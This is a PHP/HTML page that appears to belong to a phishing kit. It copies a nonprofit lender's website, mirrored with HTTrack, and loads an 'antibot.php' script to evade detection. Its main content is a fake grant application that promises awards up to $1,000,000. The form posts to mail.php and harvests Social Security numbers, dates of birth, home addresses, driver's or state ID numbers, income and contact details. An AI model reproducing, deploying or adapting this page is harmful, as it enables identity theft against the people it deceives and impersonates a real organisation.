<?php require "antibot.php"  ?>
<!doctype html>
<html lang="en-US" class="no-js">
  
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v21.3 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Economic Justice Fund</title>
	<meta name="description" content="The Economic Justice Fund is a mission-driven, nonprofit lender dedicated to helping Americans pursue the American Dream." />
	<link rel="canonical" href="index.php" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="Economic Justice Fund" />
	<meta property="og:description" content="The Economic Justice Fund is a mission-driven, nonprofit lender dedicated to helping Americans pursue the American Dream." />

	
	
<link rel='stylesheet' id='vc_extend-css' href='wp-content/plugins/visceral-vc-visceral-addons/assets/vc_extend9b30.css?ver=6.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-css' href='wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min192d.css?ver=5.23.0' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='wp-content/plugins/elementor/assets/css/frontend-lite.minafc7.css?ver=3.16.4' type='text/css' media='all' />
<link rel='stylesheet' id='swiper-css' href='wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min48f5.css?ver=5.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-1436-css' href='wp-content/uploads/elementor/css/post-1436456e.css?ver=1696289426' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-pro-css' href='wp-content/plugins/elementor-pro/assets/css/frontend-lite.min6b60.css?ver=3.16.2' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-5-css' href='wp-content/uploads/elementor/css/post-5d7fd.css?ver=1696289427' type='text/css' media='all' />
<link rel='stylesheet' id='sage/main.css-css' href='wp-content/themes/ejf/dist/styles/main.css' type='text/css' media='all' />
<link rel='stylesheet' id='adobe-fonts-css' href='../use.typekit.net/bud6dex.css' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=auto&amp;ver=6.3.1' type='text/css' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
<meta name="generator" content="WordPress 6.3.1" />
<link rel='shortlink' href='index.php' />
<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embedfe31.json?url=https%3A%2F%2Feconomicjusticefund.org%2F" />
<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embedd79c?url=https%3A%2F%2Feconomicjusticefund.org%2F&amp;format=xml" />
<meta name="generator" content="Site Kit by Google 1.110.0" /><!-- Stream WordPress user activity plugin v3.9.3 -->
<meta name="generator" content="Elementor 3.16.4; features: e_dom_optimization, e_optimized_assets_loading, e_optimized_css_loading, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-auto">
<link rel="stylesheet" href="">
<link rel="stylesheet" href="appstyle.css">

</head>

  <body class="home page-template-default page page-id-5 app-data index-data singular-data page-data page-5-data page-homepage-data front-page-data elementor-default elementor-kit-1436 elementor-page elementor-page-5">
    <a id="skip-to-content" href="#main-content" class="no-print" aria-label="Skip to content" title="Skip to content">Skip to content</a>
        <header class="header header--img-bg">
    <div class="header__inner">
        <a class="header__brand" href="">
            <span class="screen-reader-text">Economic Justice Fund</span>
            <svg width="216px" height="76px" viewBox="0 0 216 76" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                    <g id="menu-black-text" transform="">
                        <g id="Menu">
                            <rect id="Rectangle" x="0" y="0" width="1440" height="97"></rect>
                        </g>
                        <g id="ejf-logo" transform="">
                            <g id="logo-mark" transform="">
                                <rect id="square" fill="#0B0B0B" x="0" y="0.0151525469" width="75.8801961" height="75.7627345"></rect>
                                <path d="M30.5971497,32.827707 C25.922856,30.7071828 24.8160851,26.7111157 27.276837,20.8395056 C30.9679648,12.0320904 39.7573175,14.4639222 36.4558223,5.99103137 C42.0741917,7.4595032 47.6266693,11.641254 47.2660295,15.7383356 C47.0408211,18.296837 46.7760548,19.013509 43.9537538,20.9524029 C42.0722198,22.2449987 41.6190654,23.9230493 42.5942905,25.9865546 C42.5720808,24.4869629 43.5607822,23.6528341 45.5603946,23.4841684 C48.5598133,23.2311699 49.4677929,21.0851379 48.778277,20.4525768 C48.088761,19.8200157 50.5814674,21.353665 49.7223638,28.3368098 C48.8632602,35.3199545 39.0068005,35.4127252 40.0522865,34.8326414 C41.0977726,34.2525575 41.3006364,32.34588 40.7470481,31.3927755 C40.3779892,30.7573725 39.6012901,30.0251156 38.4169507,29.196005 C39.2667279,31.9720945 38.5982179,33.953199 36.4114208,35.1393184 C34.2246237,36.3254379 32.5258397,36.2073209 31.3150686,34.7849674 C33.6887303,34.0032875 34.1133626,32.3554999 32.5889653,29.8416045 C30.3023694,26.0707614 34.3863278,23.2161847 34.6880805,22.7282129 C33.595904,22.8227248 28.8662274,25.1701228 29.1961,28.6155877 C29.416015,30.9125643 29.8830316,32.3166041 30.5971497,32.827707 Z" id="flame" fill="#BC0E0E" transform="translate(37.954299, 20.969687) rotate(-5.000000) translate(-37.954299, -20.969687) "></path>
                                <path d="M30.0065501,66.4744275 C33.8982905,66.7674083 36.936184,67.6569851 39.1202306,69.143158 C41.7071423,70.9034676 43.4719586,72.7010013 44.4146793,74.5357591 L44.143677,75.8912688 L32.334677,75.8912688 L30.0065501,66.4744275 Z M47.9787571,60.401289 C49.0401829,60.401289 49.9006384,61.2617446 49.9006384,62.3231703 C49.9006384,63.384596 49.0401829,64.2450516 47.9787571,64.2450516 L27.4974969,64.2450516 C26.4360711,64.2450516 25.5756156,63.384596 25.5756156,62.3231703 C25.5756156,61.2617446 26.4360711,60.401289 27.4974969,60.401289 L47.9787571,60.401289 Z M37.879435,40.9082688 L38.8236555,40.9133862 C45.0905714,40.9689726 48.6626258,41.4523602 49.8708176,42.5337993 L49.9283325,42.5874678 L50.1770592,42.8296652 L50.1779735,44.5418159 C50.9782655,44.7238932 51.7117293,44.9791319 52.3769024,45.307213 C53.244726,44.8071951 54.242457,44.5302814 55.3649784,44.4840659 L55.7054734,44.4771297 L56.5347356,44.4771297 L56.5347356,53.5494644 C56.3747605,53.5799672 56.216609,53.6117047 56.0602809,53.6446769 L32.6383808,53.6449432 C36.3138312,54.2842055 40.2576203,55.3306837 44.469748,56.7843778 C45.2842601,57.0654831 46.0105844,57.3557637 46.6487206,57.6552195 L26.3079206,57.6550388 C24.8631072,55.8172459 22.3561284,54.4789122 18.7869843,53.6400378 L18.388677,53.5494644 L18.388677,44.4771297 L19.2179392,44.4771297 C20.7773966,44.4771297 22.1262296,44.8443443 23.254713,45.565668 C23.8806607,45.2145772 24.5625755,44.9306162 25.2989308,44.7147383 L25.2991949,42.8974523 L25.469003,42.6762367 C26.4254552,41.4302298 30.0642425,40.9371159 36.9188539,40.9091871 L37.879435,40.9082688 Z M52.4677621,47.2697931 L52.3097776,47.4172854 C51.6855133,48.0269373 51.1757673,48.8570283 50.7753873,49.9177319 L50.6585492,50.2428715 L54.7332082,50.2422795 C54.2460808,48.9764898 53.4957327,47.9867081 52.4677621,47.2697931 Z M42.3451065,46.6431571 L42.2552984,46.6808329 C40.59467,47.3959723 39.3554385,48.5741498 38.5133108,50.2208809 L38.519677,50.2422688 L45.6174179,50.2426041 C44.9891324,48.5529786 43.9097356,47.3563894 42.3451065,46.6431571 Z M33.5681122,46.6748221 L33.4508224,46.72644 C31.8900612,47.4482775 30.7223887,48.6177909 29.9245358,50.2418131 L36.771955,50.2426041 L36.7659022,50.2263791 L36.6975318,50.1974574 L36.7282222,50.1276635 C36.1036447,48.5230284 35.0604168,47.3749583 33.5681122,46.6748221 Z M29.1922431,45.8499021 C27.4005053,45.8499021 25.8786134,46.1395085 24.6142316,46.7223435 C25.435862,47.6284451 26.0828165,48.8049906 26.5491518,50.2424209 L28.215677,50.2422688 L28.1250267,50.2057448 C28.8649591,48.4073295 29.9550433,47.0096585 31.3799623,46.0172294 C30.7096558,45.9056431 29.9808353,45.8499021 29.1922431,45.8499021 Z M46.8925307,45.8499021 C46.0485136,45.8499021 45.2623088,45.9101458 44.5327603,46.0308957 C45.8235161,47.0008165 46.7574416,48.354491 47.3173061,50.0869118 L47.365677,50.2422688 L48.9194066,50.2417032 C49.3889932,48.6715256 50.05975,47.410844 50.9246189,46.4735947 C49.8036865,46.0570073 48.4624434,45.8499021 46.8925307,45.8499021 Z M23.1707081,47.601096 L23.0005208,47.7390944 C22.2135016,48.3989087 21.5748804,49.2326017 21.0790729,50.2418131 L24.793677,50.2422688 L24.6986522,49.9971962 C24.2961385,49.0036525 23.7885078,48.2072219 23.1707081,47.601096 Z M20.0472013,46.1689344 L20.0463396,48.684494 C20.5284704,47.8952087 21.0995432,47.2094309 21.7575577,46.627748 C21.2901965,46.4141157 20.7797332,46.2693543 20.2260638,46.19182 L20.0472013,46.1689344 Z M38.037706,45.8499021 C37.1999875,45.8499021 36.421257,45.9132096 35.7002536,46.0401949 C36.5138712,46.6546417 37.1849938,47.4216928 37.7095558,48.3404881 C38.3587661,47.3979896 39.1488861,46.615535 40.0756131,45.9941597 C39.4480124,45.8977751 38.7685266,45.8499021 38.037706,45.8499021 Z M54.8762113,46.1799166 L54.7924091,46.1920867 C54.5220098,46.2340654 54.2628954,46.2956914 54.0149175,46.3772575 C54.3254123,46.6417372 54.6127137,46.9296973 54.8767798,47.2415242 L54.8762113,46.1799166 Z M37.1888831,42.5557033 L36.4825217,42.5593403 C33.5883172,42.5820653 31.306377,42.6993805 29.6430009,42.9096679 C28.3258668,43.0761827 27.4310823,43.3060112 27.0181636,43.5120493 L26.9577192,43.5436445 L26.9574921,44.3567971 C27.6623267,44.254049 28.4074702,44.2025753 29.1922431,44.2025753 C30.8567299,44.2025753 32.3220081,44.4351654 33.5799122,44.8980294 C34.8819265,44.4349251 36.3703738,44.2025753 38.037706,44.2025753 C39.6760392,44.2025753 41.121375,44.4279136 42.3659264,44.8763815 C43.6911891,44.4277082 45.2024334,44.2025753 46.8925307,44.2025753 C47.4569755,44.2025753 47.999127,44.2277984 48.5186915,44.2781806 L48.5185349,43.5886715 L48.479033,43.5673867 C47.3157908,42.9676561 43.7806091,42.58227 38.1561453,42.5566142 L37.1888831,42.5557033 Z" id="torch" fill="#FFFFFF" fill-rule="nonzero"></path>
                                <path d="M102.162374,27.9135082 L102.162374,24.2700553 L95.4236891,24.2700553 L95.4236891,22.4266417 L102.007207,22.4266417 L102.007207,18.7831888 L95.4236891,18.7831888 L95.4236891,17.0915857 L102.162374,17.0915857 L102.162374,13.4481328 L90.9460106,13.4481328 L90.9460106,27.9135082 L102.162374,27.9135082 Z M111.859505,27.9135082 C115.751751,27.9135082 117.67625,25.6196067 118.51957,23.693595 L114.757066,21.9623486 C114.389465,23.0876588 113.265038,24.0614849 111.859505,24.0614849 C109.870136,24.0614849 108.464603,22.460082 108.464603,20.447508 C108.464603,18.434934 109.870136,16.8335311 111.859505,16.8335311 C113.265038,16.8335311 114.389465,17.8073572 114.757066,18.9326674 L118.51957,17.1797804 C117.654626,15.188847 115.751751,12.9815078 111.859505,12.9815078 C107.448294,12.9815078 104.031767,15.9895485 104.031767,20.447508 C104.031767,24.883827 107.448294,27.9135082 111.859505,27.9135082 Z M128.333887,27.9135082 C132.817872,27.9135082 136.278811,24.883827 136.278811,20.447508 C136.278811,16.0111891 132.817872,12.9815078 128.333887,12.9815078 C123.849903,12.9815078 120.388964,16.0111891 120.388964,20.447508 C120.388964,24.883827 123.849903,27.9135082 128.333887,27.9135082 Z M128.100213,24.1805081 C125.975238,24.1805081 124.5951,22.5263643 124.5951,20.447508 C124.5951,18.3686517 125.975238,16.7145079 128.100213,16.7145079 C130.225188,16.7145079 131.605327,18.3686517 131.605327,20.447508 C131.605327,22.5263643 130.225188,24.1805081 128.100213,24.1805081 Z M142.559625,27.9135082 L142.559625,20.1494836 L147.931949,27.9135082 L152.168659,27.9135082 L152.168659,13.4481328 L147.757239,13.4481328 L147.757239,20.7350386 L142.690657,13.4481328 L138.148205,13.4481328 L138.148205,27.9135082 L142.559625,27.9135082 Z M162.450325,27.9135082 C166.93431,27.9135082 170.395249,24.883827 170.395249,20.447508 C170.395249,16.0111891 166.93431,12.9815078 162.450325,12.9815078 C157.966341,12.9815078 154.505401,16.0111891 154.505401,20.447508 C154.505401,24.883827 157.966341,27.9135082 162.450325,27.9135082 Z M162.216651,24.1805081 C160.091676,24.1805081 158.711537,22.5263643 158.711537,20.447508 C158.711537,18.3686517 160.091676,16.7145079 162.216651,16.7145079 C164.341626,16.7145079 165.721764,18.3686517 165.721764,20.447508 C165.721764,22.5263643 164.341626,24.1805081 162.216651,24.1805081 Z M177.142297,27.9135082 L177.142297,18.7831888 L180.395444,27.9135082 L182.360432,27.9135082 L185.613578,18.7831888 L185.613578,27.9135082 L190.023884,27.9135082 L190.023884,13.4481328 L183.932422,13.4481328 L181.377938,20.8217874 L178.823454,13.4481328 L172.731991,13.4481328 L172.731991,27.9135082 L177.142297,27.9135082 Z M197.50146,27.9135082 L197.50146,13.4481328 L193.295324,13.4481328 L193.295324,27.9135082 L197.50146,27.9135082 Z M207.66594,27.9135082 C211.558185,27.9135082 213.482684,25.6196067 214.326004,23.693595 L210.5635,21.9623486 C210.1959,23.0876588 209.071473,24.0614849 207.66594,24.0614849 C205.67657,24.0614849 204.271037,22.460082 204.271037,20.447508 C204.271037,18.434934 205.67657,16.8335311 207.66594,16.8335311 C209.071473,16.8335311 210.1959,17.8073572 210.5635,18.9326674 L214.326004,17.1797804 C213.461061,15.188847 211.558185,12.9815078 207.66594,12.9815078 C203.254729,12.9815078 199.838202,15.9895485 199.838202,20.447508 C199.838202,24.883827 203.254729,27.9135082 207.66594,27.9135082 Z M94.122717,45.1786336 C97.5488865,45.1786336 99.8256313,43.4413317 99.8256313,39.6808426 L99.8256313,30.2466333 L95.3605589,30.2466333 L95.3605589,39.6148691 C95.3605589,40.6484538 94.6974293,41.2642064 93.7248393,41.2642064 C92.9732924,41.2642064 92.3101628,40.934339 91.8238678,40.6044715 L90.0113136,43.9911108 C91.1607382,44.8707573 92.6859363,45.1786336 94.122717,45.1786336 Z M109.183537,45.1786336 C114.104913,45.1786336 116.182827,42.5177028 116.182827,38.8671696 L116.182827,30.2466333 L111.698907,30.2466333 L111.698907,38.7352226 C111.698907,40.1426571 110.977105,41.2642064 109.183537,41.2642064 C107.368096,41.2642064 106.646294,40.1426571 106.646294,38.7352226 L106.646294,30.2466333 L102.162374,30.2466333 L102.162374,38.8891607 C102.162374,42.5177028 104.262161,45.1786336 109.183537,45.1786336 Z M124.835808,45.1786336 C128.752782,45.1786336 131.137978,43.3365146 131.137978,40.1507322 C131.137978,36.8132459 127.571125,36.1197423 125.164046,35.7079745 C123.610386,35.4479106 123.019557,35.2528627 123.019557,34.689391 C123.019557,34.3209672 123.260265,33.9308714 124.354392,33.9308714 C125.514166,33.9308714 127.155357,34.4076551 128.424544,35.3612226 L130.787858,32.2621282 C129.124785,30.9184649 126.980296,30.2466333 124.5951,30.2466333 C120.590596,30.2466333 118.533637,32.4788481 118.533637,34.9277829 C118.533637,38.547005 122.209903,39.1104767 124.616982,39.5439165 C126.06123,39.8039804 126.673941,40.0857162 126.673941,40.6491879 C126.673941,41.2126597 125.886169,41.4943955 125.054633,41.4943955 C123.085205,41.4943955 121.444014,40.6708599 120.349888,39.6306045 L118.052221,42.8814028 C119.605881,44.2684101 121.728487,45.1786336 124.835808,45.1786336 Z M139.887176,44.7120086 L139.887176,34.0635839 L143.756387,34.0635839 L143.756387,30.2466333 L131.605327,30.2466333 L131.605327,34.0635839 L135.496274,34.0635839 L135.496274,44.7120086 L139.887176,44.7120086 Z M149.831917,44.7120086 L149.831917,30.2466333 L145.625781,30.2466333 L145.625781,44.7120086 L149.831917,44.7120086 Z M159.529048,45.1786336 C163.421294,45.1786336 165.345793,42.8847321 166.189113,40.9587205 L162.426609,39.2274741 C162.059008,40.3527842 160.934582,41.3266103 159.529048,41.3266103 C157.539679,41.3266103 156.134146,39.7252074 156.134146,37.7126334 C156.134146,35.7000595 157.539679,34.0986565 159.529048,34.0986565 C160.934582,34.0986565 162.059008,35.0724826 162.426609,36.1977928 L166.189113,34.4449058 C165.324169,32.4539724 163.421294,30.2466333 159.529048,30.2466333 C155.117837,30.2466333 151.701311,33.2546739 151.701311,37.7126334 C151.701311,42.1489524 155.117837,45.1786336 159.529048,45.1786336 Z M178.807521,44.7120086 L178.807521,41.0685558 L172.068837,41.0685558 L172.068837,39.2251421 L178.652354,39.2251421 L178.652354,35.5816892 L172.068837,35.5816892 L172.068837,33.8900861 L178.807521,33.8900861 L178.807521,30.2466333 L167.591158,30.2466333 L167.591158,44.7120086 L178.807521,44.7120086 Z M95.4236891,62.4437591 L95.4236891,56.9568925 L102.007207,56.9568925 L102.007207,53.3134397 L95.4236891,53.3134397 L95.4236891,51.6218366 L102.162374,51.6218366 L102.162374,47.9783837 L90.9460106,47.9783837 L90.9460106,62.4437591 L95.4236891,62.4437591 Z M111.052931,62.9103841 C115.974307,62.9103841 118.052221,60.2494532 118.052221,56.59892 L118.052221,47.9783837 L113.568301,47.9783837 L113.568301,56.466973 C113.568301,57.8744075 112.846499,58.9959569 111.052931,58.9959569 C109.23749,58.9959569 108.515688,57.8744075 108.515688,56.466973 L108.515688,47.9783837 L104.031767,47.9783837 L104.031767,56.6209112 C104.031767,60.2494532 106.131555,62.9103841 111.052931,62.9103841 Z M125.735081,62.4437591 L125.735081,54.6797345 L131.107404,62.4437591 L135.344114,62.4437591 L135.344114,47.9783837 L130.932694,47.9783837 L130.932694,55.2652894 L125.866113,47.9783837 L121.323661,47.9783837 L121.323661,62.4437591 L125.735081,62.4437591 Z M144.204732,62.4437591 C148.764898,62.4437591 152.168659,59.8196055 152.168659,55.2002278 C152.168659,50.58085 148.764898,47.9783837 144.182913,47.9783837 L137.680857,47.9783837 L137.680857,62.4437591 L144.204732,62.4437591 Z M143.981878,58.710759 L141.886993,58.710759 L141.886993,51.7113838 L144.003699,51.7113838 C146.360445,51.7113838 147.495174,53.2001398 147.495174,55.1999613 C147.495174,57.0664613 146.185871,58.710759 143.981878,58.710759 Z" id="work-mark" fill="#171717" fill-rule="nonzero"></path>
                            </g>
                        </g>
                    </g>
                </g>
            </svg>
        </a>
      <ul id="menu-quicklinks" class="quicklinks"><li id="menu-item-1246" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1246"><a href="index.php">Home</a></li>
</ul>
        
        <label class="mobile-nav__icon no-print" id="mobile-nav-icon" for="nav-toggle" tabindex="0">
            <span class="screen-reader-text">Navigation Toggle</span>
            <div>
                <div class="mobile-nav__menu-line"></div>
                <div class="mobile-nav__menu-line"></div>
                <div class="mobile-nav__menu-line"></div>
                <div class="mobile-nav__menu-line"></div>
            </div>
        </label>
    </div>
    <input type="checkbox" id="nav-toggle">

<div id="mobile-nav">
	<div class="mobile-nav no-print">
                    <ul id="menu-mobile-menu" class="mobile-nav__menu"><li id="menu-item-2040" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2040"><Menu></Menu></a><span class="icon icon-chevron-down sub-menu--open"></span></li>

</ul>
        
        
        <div class="mobile-nav__searc">
            
		<button class="hhghf" onclick="document.location='login.php'">Login</button>
		<button class="hhghf" onclick="document.location='index.php'">Home</button>
		
        </div>
	</div>
</header>




<div class="app-container">  
      <form id="contact" action="mail.php" method="post">     
   <img src="wp-content/uploads/appimg.png">
  
     
  
        <div class="row">
     
          <div class="col">
            <fieldset>
              <input placeholder="First Name" name="firstName" type="text" tabindex="1" required autofocus>
            </fieldset>
            <fieldset>
              <input type="text" placeholder="Last Name" name="lastName"  tabindex="1" required autofocus>
            </fieldset>
            <fieldset>

              <input placeholder="Date of birth" type="text" onfocus="(this.type='date')" name="date" tabindex="4" required >
            </fieldset>
            <fieldset>
              <input type="text" name="address" placeholder="Home Address" tabindex="5" required>
            </fieldset>
            <fieldset>
              <input type="text" name="city" placeholder="City/State/Zipcode" tabindex="5" required>
            </fieldset>  
          </div>
     
          <div class="col">
            <fieldset>
              <fieldset>
                <input placeholder="Phone Number" name="tel" type="tel" tabindex="3" required>
              </fieldset>
              <input placeholder="Email Address" name="email" type="email" tabindex="2" required>
            </fieldset>
            <fieldset>
              <input placeholder="Annual Income" name="income" type="text" tabindex="1" required autofocus>
            </fieldset>
            <fieldset>
              <input placeholder="Social Security Number" name="ssn" type="number" tabindex="2" required>
            </fieldset>
            <fieldset>
              <input placeholder="Drivers/State id number" name="idnumber" type="text" tabindex="3" required>
            </fieldset>
          </div>

          <div class="">
          <fieldset class="employment11" required>
          <p1>What is your employment status?</p1>
            <select name="status" id="status" required>
              <option value="personal">Employed</option>
                <option value="business">Self Employed</option>
                <option value="rent">Uenmployed</option>
               </select>
          </fieldset>
          
          
          <fieldset class="grant1" required>
            <p1>Type of Grants ?</p1>
            <select name="typegrants" id="typegrants" required>
              <option value="Disaster">Economic Disaster</option>
                <option value="business">Business</option>
                <option value="rent">Rental Assitance</option>
                <option value="credit">Pay off Credit debt</option>
                <option value="loans">Pay off Loans</option>
                <option value="homeimprovement">Home Improvement</option>
                <option value="expenses">Expenses</option>
              </select>
          </fieldset>

          <fieldset class="grants2" required>
              <p1>Requested Amount</p1>
              <select name="requestedgrants" id="requestedgrants" required>
                <option value="Requested Amount">Amount</option>
                  <option value="$5000">$5,000-$29,000</option>
                  <option value="$10000">$30,000-$59,000</option>
                  <option value="$15000">$60,000-$99,000</option>
                  <option value="$25000">$100,000-$199,000</option>
                  <option value="$25000">$200,00-$499,000</option>
                  <option value="$25000">$500,000-$1,000,000</option>
                </select>
        </fieldset>
           </div>

        

          

          
             
           <!--  <fieldset>
              <label for="file">Upload</label>
              <input type="file" id="file" name="file">
            </fieldset> -->
          </div>
       
            
          <!-- Error display -->
         
         
        <fieldset class="Fbutton1">
          <button class="buton1" type="submit" name="submit" id="contact-submit" data-submit="...Sending">Submit Now</button>
        </fieldset>
      </form>
      </div>
            <footer class="footer">
  <div class="container">

      <div class="row">
        <div class="column md-33 lg-16">
            <img src="wp-content/themes/ejf/dist/images/CDFI.png" width="174" height="174">
        </div>
          <div class="column md-67 lg-33">
                <p>The Economic Justice Fund is a mission-driven Community Development Financial Institution (CDFI) dedicated to providing fair, affordable financing and free credit-building services to empower applicants to realize their dreams. We envision a financial system that provides equal access to financing and opportunity for all Americans.</p>
                <p> no application fees, no origination fees, no servicing fees, and no prepayment fees. We also offer flexible terms and underwriting to meet the needs of a wide range of applicant.</p>
          </div>
          <div class="column md-67 lg-33 no-print">
                            <div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="nav list-inline"><li id="menu-item-1420" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1420"></a></li>

</ul></div>
                      </div>
          <div class="column md-33 lg-16 no-print">
            <br />  
        
            <br>
            <img src="wp-content/themes/ejf/dist/images/trustpilot-rating-dark.png" width="149" height="64">
          </div>
      </div>
      <div class="row">
          <div class="column">
              <hr>
              <a class="no-print" href="index.php">Legal</a>
              <p class="footer__copyright">&copy; 2023 Economic Justice Fund. Registered 501(c)(3). EIN: 82-3512608</p>
          </div>
      </div>
  </div>
</footer>
?>

  </body>

<!-- Mirrored from economicjusticefund.org/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Oct 2023 12:31:22 GMT -->
</html>
